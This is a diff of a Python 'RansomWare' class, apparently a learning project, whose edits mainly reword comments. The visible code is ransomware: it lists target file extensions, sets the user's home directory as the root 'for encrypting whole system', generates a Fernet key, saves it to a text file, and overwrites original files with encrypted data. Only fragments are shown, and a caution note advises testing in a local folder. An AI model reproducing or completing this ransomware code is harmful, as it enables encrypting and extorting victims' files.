@@ -23,9 +23,9 @@ class RansomWare:
     # File exstensions to seek out and Encrypt
     file_exts = [
         'txt',
-       # We comment out 'jpg' so that we can see the RansomWare only encrypts specific files that we have chosen-
+       # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
        # -and leaves other files un-ecnrypted etc.
-       # 'jpg', 
+       # 'png', 
 
     ]
 
@@ -43,7 +43,7 @@ class RansomWare:
             CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
             CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
         '''
-        # Use sysroot to create absolute path for files etc for encrypting whole system
+        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
         self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot' # Debugging/Testing
@@ -59,7 +59,8 @@ class RansomWare:
         # Creates a Fernet object with encrypt/decrypt methods
         self.crypter = Fernet(self.key)
 
-
+    
+    # Write the fernet(symmetric key) to text file
     def write_key(self):
         with open('fernet_key.txt', 'wb') as f:
             f.write(self.key)
@@ -109,7 +110,7 @@ class RansomWare:
                 print('> File decrpyted')
                 print(_data)
         with open(file_path, 'wb') as fp:
-            # Write encrypted data to file using same filename to overwrite original file
+            # Write encrypted/decrypted data to file using same filename to overwrite original file
             fp.write(_data)
 
 
